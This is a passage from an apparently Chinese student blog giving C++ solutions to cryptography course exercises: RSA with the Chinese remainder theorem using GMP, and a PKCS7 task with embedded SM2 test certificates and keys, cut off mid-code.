class="string">&quot;temp = %Zd\n&quot;</span>, temp);</span><br><span class="line">		<span class="built_in">gmp_printf</span>(<span class="string">&quot;aPow = %Zd\n&quot;</span>, aPow);</span><br><span class="line">		<span class="built_in">gmp_printf</span>(<span class="string">&quot;eBack = %Zd\n&quot;</span>, eBack);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">mpz_mul</span>(aPow, aPow, aPow);		<span class="comment">// 平方</span></span><br><span class="line">		<span class="built_in">mpz_mod</span>(aPow, aPow, n);</span><br><span class="line">		<span class="built_in">mpz_div_ui</span>(eBack, eBack, <span class="number">2</span>);</span><br><span class="line">		<span class="built_in">mpz_mod_ui</span>(temp, eBack, <span class="number">2</span>);		<span class="comment">// 求余数</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ChineseRemainderTheorem</span><span class="params">(<span class="keyword">mpz_t</span> paraB1, <span class="keyword">mpz_t</span> paraB2, <span class="keyword">mpz_t</span> paraM1, <span class="keyword">mpz_t</span> paraM2)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">mpz_t</span> b1, b2, m1, m2, m, m1Inverse, m2Inverse;</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(b1, paraB1);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(b2, paraB2);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(m1, paraM1);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(m2, paraM2);</span><br><span class="line">	<span class="built_in">mpz_init</span>(m1Inverse);</span><br><span class="line">	<span class="built_in">mpz_init</span>(m2Inverse);</span><br><span class="line">	<span class="built_in">mpz_init</span>(m);</span><br><span class="line">	<span class="built_in">mpz_mul</span>(m, m1, m2);</span><br><span class="line">	<span class="built_in">calInverse</span>(m1Inverse, m1, m2);</span><br><span class="line">	<span class="built_in">calInverse</span>(m2Inverse, m2, m1);</span><br><span class="line">	<span class="built_in">mpz_mul</span>(b1, b1, m2);</span><br><span class="line">	<span class="built_in">mpz_mul</span>(b1, b1, m2Inverse);</span><br><span class="line">	<span class="built_in">mpz_mul</span>(b2, b2, m1);</span><br><span class="line">	<span class="built_in">mpz_mul</span>(b2, b2, m1Inverse);</span><br><span class="line">	<span class="built_in">mpz_add</span>(b1, b1, b2);</span><br><span class="line">	<span class="built_in">mpz_mod</span>(b1, b1, m);</span><br><span class="line">	<span class="built_in">gmp_printf</span>(<span class="string">&quot;%Zd\n&quot;</span>, b1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">mpz_t</span> e, m, p, q, b1, b2;</span><br><span class="line">	<span class="built_in">mpz_init</span>(e);</span><br><span class="line">	<span class="built_in">mpz_init</span>(m);</span><br><span class="line">	<span class="built_in">mpz_init</span>(p);</span><br><span class="line">	<span class="built_in">mpz_init</span>(q);</span><br><span class="line">	<span class="built_in">mpz_init</span>(b1);</span><br><span class="line">	<span class="built_in">mpz_init</span>(b2);</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="built_in">gmp_scanf</span>(<span class="string">&quot;%Zd%Zd%Zd%Zd&quot;</span>, e, m, p, q);</span><br><span class="line">		<span class="built_in">mpz_set</span>(b1, m);</span><br><span class="line">		<span class="built_in">mpz_set</span>(b2, m);</span><br><span class="line">		<span class="built_in">expmod</span>(b1, e, p);<span class="comment">//m^e mod p</span></span><br><span class="line">		<span class="built_in">expmod</span>(b2, e, q);<span class="comment">//m^e mod q</span></span><br><span class="line">		<span class="built_in">ChineseRemainderTheorem</span>(b1, b2, p, q);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h4><p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/VII">oj | 中国剩余定理</a></p>
<p>题目要求：<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030111741.png" alt="中国剩余定理"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;gmp.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;libgmp-10.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> GCC optimize(<span class="meta-string">&quot;O3&quot;</span>)</span></span><br><span class="line"><span class="keyword">mpz_t</span> st[<span class="number">800</span>];</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">1000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calInverse</span><span class="params">(<span class="keyword">mpz_t</span> eInverse, <span class="keyword">mpz_t</span> paraE, <span class="keyword">mpz_t</span> paraN)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用辗转相除法求逆</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">mpz_t</span> n, temp, temp1, temp2, e;</span><br><span class="line">    <span class="built_in">mpz_init_set</span>(e, paraE);</span><br><span class="line">    <span class="built_in">mpz_init_set</span>(n, paraN);</span><br><span class="line">    <span class="built_in">mpz_init</span>(temp);</span><br><span class="line">    <span class="built_in">mpz_init</span>(temp1);</span><br><span class="line">    <span class="built_in">mpz_init</span>(temp2);</span><br><span class="line">    <span class="comment">//mpz_init_set_ui(temp, 0);</span></span><br><span class="line">    <span class="comment">//mpz_sub(n, temp, n);</span></span><br><span class="line">    <span class="built_in">mpz_neg</span>(n, n);</span><br><span class="line">    <span class="comment">// 求解e的逆</span></span><br><span class="line">    <span class="comment">//mpz_mod(temp, e, n);</span></span><br><span class="line">    <span class="comment">//mpz_sub(temp1, e, temp);</span></span><br><span class="line">    <span class="comment">//mpz_div(temp1, temp1, n);</span></span><br><span class="line">    <span class="built_in">mpz_tdiv_qr</span>(temp1, temp, e, n);</span><br><span class="line">    <span class="built_in">mpz_set</span>(st[<span class="number">0</span>], temp1);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">mpz_cmp_ui</span>(temp, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="built_in">mpz_set</span>(st[count], temp1);</span><br><span class="line">        <span class="built_in">mpz_set</span>(e, n);</span><br><span class="line">        <span class="built_in">mpz_set</span>(n, temp);</span><br><span class="line">        <span class="built_in">mpz_tdiv_qr</span>(temp1, temp, e, n);</span><br><span class="line">        <span class="comment">//mpz_mod(temp, e, n);</span></span><br><span class="line">        <span class="comment">//mpz_sub(temp1, e, temp);</span></span><br><span class="line">        <span class="comment">//mpz_div(temp1, temp1, n);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mpz_mul</span>(temp, temp1, e);</span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(temp2, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">mpz_cmp_ui</span>(temp, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">mpz_neg</span>(temp2, temp2);</span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(temp1, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mpz_sub</span>(n, temp1, n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = count; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">mpz_init_set</span>(temp, temp2);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(temp2, temp2, st[i]);</span><br><span class="line">        <span class="built_in">mpz_sub</span>(temp2, temp1, temp2);</span><br><span class="line">        <span class="built_in">mpz_set</span>(temp1, temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//gmp_printf(&quot;%Zd\n&quot;, temp1);</span></span><br><span class="line">    <span class="built_in">mpz_set</span>(eInverse, temp1);</span><br><span class="line">    <span class="built_in">mpz_mod</span>(eInverse, eInverse, paraN);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">expmod</span><span class="params">(<span class="keyword">mpz_t</span> a, <span class="keyword">mpz_t</span> paraE, <span class="keyword">mpz_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 平方乘算法</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">mpz_t</span> aBack;</span><br><span class="line">    <span class="built_in">mpz_init_set</span>(aBack, a);</span><br><span class="line">    <span class="built_in">mpz_get_str</span>(str, <span class="number">2</span>, paraE);		<span class="comment">// 将其转化为二进制字符串，加速运算</span></span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(a, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (str[i] != <span class="string">&#x27;\0&#x27;</span>) &#123;		<span class="comment">// 使用平方乘算法</span></span><br><span class="line">        <span class="built_in">mpz_mul</span>(a, a, a);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(a, a, n);</span><br><span class="line">        <span class="keyword">if</span> (str[i] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">mpz_mul</span>(a, a, aBack);</span><br><span class="line">            <span class="built_in">mpz_mod</span>(a, a, n);</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">mpz_t</span> e, m, p, q, b1, b2, B, d, phi, temp, pInverse, qInverse, _p, _q, d1, d2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">800</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">mpz_init</span>(st[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化一大推</span></span><br><span class="line">    <span class="built_in">mpz_init</span>(e);<span class="built_in">mpz_init</span>(m);<span class="built_in">mpz_init</span>(p);<span class="built_in">mpz_init</span>(q);<span class="built_in">mpz_init</span>(b1);<span class="built_in">mpz_init</span>(b2);</span><br><span class="line">    <span class="built_in">mpz_init</span>(B);<span class="built_in">mpz_init</span>(d);<span class="built_in">mpz_init</span>(temp);<span class="built_in">mpz_init</span>(phi);<span class="built_in">mpz_init</span>(pInverse);</span><br><span class="line">    <span class="built_in">mpz_init</span>(qInverse);<span class="built_in">mpz_init</span>(_p);<span class="built_in">mpz_init</span>(_q);<span class="built_in">mpz_init</span>(d1);<span class="built_in">mpz_init</span>(d2);</span><br><span class="line">    <span class="built_in">gmp_scanf</span>(<span class="string">&quot;%d%Zd%Zd%Zd&quot;</span>,&amp;n , p, q, e);</span><br><span class="line">    <span class="built_in">calInverse</span>(pInverse, p, q);		<span class="comment">// 计算中国剩余定理需要用到的逆</span></span><br><span class="line">    <span class="built_in">calInverse</span>(qInverse, q, p);</span><br><span class="line">    <span class="built_in">mpz_mul</span>(B, p, q);		<span class="comment">// 计算p q之积</span></span><br><span class="line">    <span class="built_in">mpz_sub_ui</span>(_p, p, <span class="number">1</span>);	<span class="comment">// 计算p-1和q-1</span></span><br><span class="line">    <span class="built_in">mpz_sub_ui</span>(_q, q, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">mpz_mul</span>(phi, _p, _q);</span><br><span class="line">    <span class="built_in">calInverse</span>(d, e, phi);	<span class="comment">// 计算d的逆e</span></span><br><span class="line">    <span class="built_in">mpz_mod</span>(d1, d, _p);		<span class="comment">// 使用中国剩余定理，分别将d模除p-1和q-1</span></span><br><span class="line">    <span class="built_in">mpz_mod</span>(d2, d, _q);</span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        <span class="built_in">gmp_scanf</span>(<span class="string">&quot;%Zd&quot;</span>, m);</span><br><span class="line">        <span class="built_in">mpz_set</span>(b1, m);</span><br><span class="line">        <span class="built_in">mpz_set</span>(b2, m);</span><br><span class="line">        <span class="built_in">expmod</span>(b1, d1, p);		<span class="comment">// 分别计算m^d1和m^d2</span></span><br><span class="line">        <span class="built_in">expmod</span>(b2, d2, q);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpz_mul</span>(b1, b1, q);		<span class="comment">// 运用中国剩余定理计算</span></span><br><span class="line">        <span class="built_in">mpz_mod</span>(b1, b1, B);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(b1, b1, qInverse);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(b1, b1, B);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpz_mul</span>(b2, b2, p);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(b2, b2, B);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(b2, b2, pInverse);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(b2, b2, B);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpz_add</span>(b1, b1, b2);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(b1, b1, B);</span><br><span class="line">        <span class="built_in">gmp_printf</span>(<span class="string">&quot;%Zd\n&quot;</span>, b1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="PKCS-7"><a href="#PKCS-7" class="headerlink" title="PKCS 7"></a>PKCS 7</h4><p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/VIII">oj | PKCS7</a></p>
<p>题目要求：<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030111921.png" alt="PKCS7"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/conf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/ec.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/sm3.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/bio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/pem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/x509.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/sm2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/pkcs7.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#pragma comment(lib, &quot;libcrypto.a&quot;)</span></span><br><span class="line"><span class="comment">//#pragma comment(lib, &quot;libssl.a&quot;)</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> certC[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">MIICPjCCAeWgAwIBAgIBBDAKBggqgRzPVQGDdTBbMQswCQYDVQQGEwJDTjEOMAwG \n\</span></span><br><span class="line"><span class="string">A1UECAwFSHVCZWkxDjAMBgNVBAcMBVd1SGFuMQ0wCwYDVQQKDARIVVNUMQwwCgYD \n\</span></span><br><span class="line"><span class="string">VQQLDANDU0UxDzANBgNVBAMMBmNhcm9vdDAeFw0yMDA5MjcxNDIwMjFaFw0zMDA5 \n\</span></span><br><span class="line"><span class="string">MjUxNDIwMjFaMG0xCzAJBgNVBAYTAkNOMQ4wDAYDVQQIDAVIdUJlaTENMAsGA1UE \n\</span></span><br><span class="line"><span class="string">CgwESFVTVDEMMAoGA1UECwwDQ1NFMQ4wDAYDVQQDDAVVc2VyQzEhMB8GCSqGSIb3 \n\</span></span><br><span class="line"><span class="string">DQEJARYSeG10YW5nQGh1c3QuZWR1LmNuMFkwEwYHKoZIzj0CAQYIKoEcz1UBgi0D \n\</span></span><br><span class="line"><span class="string">QgAEHSrf7RNs2+Rf1TrPeJREGSy+6YTC9t4rtp1vY7Akuct504We3iAiALcIarFt \n\</span></span><br><span class="line"><span class="string">QxQOr5Zf4l7Ybt3NocM8fLxkNqOBhzCBhDAJBgNVHRMEAjAAMAsGA1UdDwQEAwIF \n\</span></span><br><span class="line"><span class="string">4DAqBglghkgBhvhCAQ0EHRYbR21TU0wgR2VuZXJhdGVkIENlcnRpZmljYXRlMB0G \n\</span></span><br><span class="line"><span class="string">A1UdDgQWBBQvMLtMYb/dD9cNF0+s/cZNxHUBGjAfBgNVHSMEGDAWgBQAvmFbdFTO \n\</span></span><br><span class="line"><span class="string">q+yJPMhzWBQd4rm7NDAKBggqgRzPVQGDdQNHADBEAiBrTVuYbSUlOX4TYV4q094S \n\</span></span><br><span class="line"><span class="string">XgfnobZWYPeRjGmBNAEIMwIgfHrQR9RfLd62bg0iZBpfgwvtGuaCE3DX24xapZ6U \n\</span></span><br><span class="line"><span class="string">fIc= \n\</span></span><br><span class="line"><span class="string">-----END CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> certB[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">MIICHDCCAcKgAwIBAgIBAzAKBggqgRzPVQGDdTBbMQswCQYDVQQGEwJDTjEOMAwG \n\</span></span><br><span class="line"><span class="string">A1UECAwFSHVCZWkxDjAMBgNVBAcMBVd1SGFuMQ0wCwYDVQQKDARIVVNUMQwwCgYD \n\</span></span><br><span class="line"><span class="string">VQQLDANDU0UxDzANBgNVBAMMBmNhcm9vdDAeFw0yMDA5MjAyMTIxMDNaFw0zMDA5 \n\</span></span><br><span class="line"><span class="string">MTgyMTIxMDNaMEoxCzAJBgNVBAYTAkNOMQ4wDAYDVQQIDAVIdUJlaTENMAsGA1UE \n\</span></span><br><span class="line"><span class="string">CgwESFVTVDEMMAoGA1UECwwDQ1NFMQ4wDAYDVQQDDAVVc2VyQjBZMBMGByqGSM49 \n\</span></span><br><span class="line"><span class="string">AgEGCCqBHM9VAYItA0IABB+6yy4hQEnt0lkrBm8RVLXz2P/6V6i74DOkTsomIS5D \n\</span></span><br><span class="line"><span class="string">8RLpcK03vJL+UfPzQO5Ekr3LBiEPRD1oa+h5wlC6ZJejgYcwgYQwCQYDVR0TBAIw \n\</span></span><br><span class="line"><span class="string">ADALBgNVHQ8EBAMCBSAwKgYJYIZIAYb4QgENBB0WG0dtU1NMIEdlbmVyYXRlZCBD \n\</span></span><br><span class="line"><span class="string">ZXJ0aWZpY2F0ZTAdBgNVHQ4EFgQUAhr5rk22vn/vEACBoMYN1FMPmGAwHwYDVR0j \n\</span></span><br><span class="line"><span class="string">BBgwFoAUAL5hW3RUzqvsiTzIc1gUHeK5uzQwCgYIKoEcz1UBg3UDSAAwRQIhANkY \n\</span></span><br><span class="line"><span class="string">3oWdgG8jriJXuRhX5le4QjE19EnKB4rWCQcKvORfAiAR4hnLYT+dXgFCxVgPkjGO \n\</span></span><br><span class="line"><span class="string">PDXj9mXJk6crvhRRxZfWNg== \n\</span></span><br><span class="line"><span class="string">-----END CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> cacert[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">MIIB/zCCAaagAwIBAgIJAKKa0PAt9M1FMAoGCCqBHM9VAYN1MFsxCzAJBgNVBAYT \n\</span></span><br><span class="line"><span class="string">AkNOMQ4wDAYDVQQIDAVIdUJlaTEOMAwGA1UEBwwFV3VIYW4xDTALBgNVBAoMBEhV \n\</span></span><br><span class="line"><span class="string">U1QxDDAKBgNVBAsMA0NTRTEPMA0GA1UEAwwGY2Fyb290MB4XDTIwMDkyMDIwNTkx \n\</span></span><br><span class="line"><span class="string">OVoXDTMwMDkxODIwNTkxOVowWzELMAkGA1UEBhMCQ04xDjAMBgNVBAgMBUh1QmVp \n\</span></span><br><span class="line"><span class="string">MQ4wDAYDVQQHDAVXdUhhbjENMAsGA1UECgwESFVTVDEMMAoGA1UECwwDQ1NFMQ8w \n\</span></span><br><span class="line"><span class="string">DQYDVQQDDAZjYXJvb3QwWTATBgcqhkjOPQIBBggqgRzPVQGCLQNCAASJ8mm28JJR \n\</span></span><br><span class="line"><span class="string">bZKLr6DCo1+KWimpKEsiTfZM19Zi5ao7Au6YLosyN71256MWmjwkwXxJeLa0lCfm \n\</span></span><br><span class="line"><span class="string">kF/YWCX6qGQ0o1MwUTAdBgNVHQ4EFgQUAL5hW3RUzqvsiTzIc1gUHeK5uzQwHwYD \n\</span></span><br><span class="line"><span class="string">VR0jBBgwFoAUAL5hW3RUzqvsiTzIc1gUHeK5uzQwDwYDVR0TAQH/BAUwAwEB/zAK \n\</span></span><br><span class="line"><span class="string">BggqgRzPVQGDdQNHADBEAiAaZMmvE5zzXHx/TBgdUhjtpRH3Jpd6OZ+SOAfMtKxD \n\</span></span><br><span class="line"><span class="string">LAIgdKq/v2Jkmn37Y9U8FHYDfFqk5I0qlQOAmuvbVUi3yvM= \n\</span></span><br><span class="line"><span class="string">-----END CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> certA[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">MIICGzCCAcKgAwIBAgIBAjAKBggqgRzPVQGDdTBbMQswCQYDVQQGEwJDTjEOMAwG \n\</span></span><br><span class="line"><span class="string">A1UECAwFSHVCZWkxDjAMBgNVBAcMBVd1SGFuMQ0wCwYDVQQKDARIVVNUMQwwCgYD \n\</span></span><br><span class="line"><span class="string">VQQLDANDU0UxDzANBgNVBAMMBmNhcm9vdDAeFw0yMDA5MjAyMTEyMTZaFw0zMDA5 \n\</span></span><br><span class="line"><span class="string">MTgyMTEyMTZaMEoxCzAJBgNVBAYTAkNOMQ4wDAYDVQQIDAVIdUJlaTENMAsGA1UE \n\</span></span><br><span class="line"><span class="string">CgwESFVTVDEMMAoGA1UECwwDQ1NFMQ4wDAYDVQQDDAVVc2VyQTBZMBMGByqGSM49 \n\</span></span><br><span class="line"><span class="string">AgEGCCqBHM9VAYItA0IABHvafDoCgn+mlwfMr89kPlC96XsSJACun0xNLEFOnb46 \n\</span></span><br><span class="line"><span class="string">kZSeKUfRtLUcgpDoiwOVV7LiileewgJQqKFi5vy7wICjgYcwgYQwCQYDVR0TBAIw \n\</span></span><br><span class="line"><span class="string">ADALBgNVHQ8EBAMCBSAwKgYJYIZIAYb4QgENBB0WG0dtU1NMIEdlbmVyYXRlZCBD \n\</span></span><br><span class="line"><span class="string">ZXJ0aWZpY2F0ZTAdBgNVHQ4EFgQUIePApg8IOc4nvX/kMH0Cja0Mf4gwHwYDVR0j \n\</span></span><br><span class="line"><span class="string">BBgwFoAUAL5hW3RUzqvsiTzIc1gUHeK5uzQwCgYIKoEcz1UBg3UDRwAwRAIgI3Q0 \n\</span></span><br><span class="line"><span class="string">qndxJPTgvC8sPNarf7pJwdsIrU0Ajmlv4PdatU4CIHU8Pyt6rT9BaHrf8ppJduPe \n\</span></span><br><span class="line"><span class="string">GWCy2i4+1au/zyp42b0r \n\</span></span><br><span class="line"><span class="string">-----END CERTIFICATE----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> message[] = <span class="string">&quot;A0000000000111111111122222222223333333333444444444455555555556666666666777777777788888888889999999999aaaaaaaaaabbbbbbbbbbccccccccccddddddddddeeeeeeeeeeffffffffff&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> pkeyC[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">BggqgRzPVQGCLQ== \n\</span></span><br><span class="line"><span class="string">-----END EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">-----BEGIN EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">MHcCAQEEIIyXY38MKYLhXXRu/YC6+KxAYJ2rwUIlWAFwOmQKGhDboAoGCCqBHM9V \n\</span></span><br><span class="line"><span class="string">AYItoUQDQgAEHSrf7RNs2+Rf1TrPeJREGSy+6YTC9t4rtp1vY7Akuct504We3iAi \n\</span></span><br><span class="line"><span class="string">ALcIarFtQxQOr5Zf4l7Ybt3NocM8fLxkNg== \n\</span></span><br><span class="line"><span class="string">-----END EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> pkeyA[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">BggqgRzPVQGCLQ== \n\</span></span><br><span class="line"><span class="string">-----END EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">-----BEGIN EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">MHcCAQEEIErrb3NV+HqWKfoINmBAFyNAe/knxHHXt5tXi2YCqgmtoAoGCCqBHM9V \n\</span></span><br><span class="line"><span class="string">AYItoUQDQgAEe9p8OgKCf6aXB8yvz2Q+UL3pexIkAK6fTE0sQU6dvjqRlJ4pR9G0 \n\</span></span><br><span class="line"><span class="string">tRyCkOiLA5VXsuKKV57CAlCooWLm/LvAgA== \n\</span></span><br><span class="line"><span class="string">-----END EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> pkeyB[] = <span class="string">&quot;\</span></span><br><span class="line"><span class="string">-----BEGIN EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">BggqgRzPVQGCLQ== \n\</span></span><br><span class="line"><span class="string">-----END EC PARAMETERS----- \n\</span></span><br><span class="line"><span class="string">-----BEGIN EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">MHcCAQEEINQhCKslrI3tKt6cK4Kxkor/LBvM8PSv699Xea7kTXTToAoGCCqBHM9V \n\</span></span><br><span class="line"><span class="string">AYItoUQDQgAEH7rLLiFASe3SWSsGbxFUtfPY//pXqLvgM6ROyiYhLkPxEulwrTe8 \n\</span></span><br><span class="line"><span class="string">kv5R8/NA7kSSvcsGIQ9EPWhr6HnCULpklw== \n\</span></span><br><span class="line"><span class="string">-----END EC PRIVATE KEY----- \n\</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function">X509 *<span class="title">getX509</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cert)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BIO *bio;</span><br><span class="line">	bio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line">	<span class="built_in">BIO_puts</span>(bio, cert);</span><br><span class="line">    <span class="keyword">return</span>  <span class="built_in">PEM_read_bio_X509</span>(bio, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span 